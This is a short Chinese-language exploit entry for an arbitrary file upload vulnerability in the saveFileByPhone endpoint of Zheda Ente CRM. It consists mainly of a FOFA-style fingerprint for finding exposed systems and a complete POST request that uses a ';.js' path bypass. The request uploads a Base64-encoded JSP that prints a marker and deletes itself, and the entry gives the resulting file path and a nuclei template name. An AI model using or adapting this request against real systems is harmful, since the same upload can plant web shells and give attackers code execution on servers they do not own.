# 浙大恩特CRMsaveFileByPhone任意文件上传漏洞

- **系统**：浙大恩特CRMsaveFileByPhone　|　**类型**：文件上传　|　**CVE**：—
- **指纹**：`app.name="浙大恩特 CRM"`
- **请求**：`POST /entsoft/ProductAction.entphone;.js?method=saveFileByPhone&goonum=954572337&filename=usnw9.jsp&imageData=Ijwlb3V0LnByaW50KDEyNTQxMjU2Mik7bmV3IGphdmEuaW8uRmlsZShhcHBsaWNhdGlvbi5nZXRSZWFsUGF0aChyZXF1ZXN0LmdldFNlcnZsZXRQYXRoKCkpKS5kZWxldGUoKTslPiI= HTTP/1.1`
- **关键头**：`Host: {hostname}`　`Content-Length: 4`　`Content-Type: application/x-www-form-urlencoded`

**请求体 / payload**
```
test
Ijwlb3V0LnByaW50KDEyNTQxMjU2Mik7bmV3IGphdmEuaW8uRmlsZShhcHBsaWNhdGlvbi5nZXRSZWFsUGF0aChyZXF1ZXN0LmdldFNlcnZsZXRQYXRoKCkpKS5kZWxldGUoKTslPiI=

上传文件位置
/entsoft/image/goocodimg/goodoc/954572337/usnw9.jsp;.js

nuclei脚本\
\[浙大恩特客户资源管理系统-productaction-entphone--任意文件上传.yaml]\(公众号：渗透安全HackTwo>
```

**其他**
- 浙大恩特CRM saveFileByPhone任意文件上传漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * 浙大恩特CRM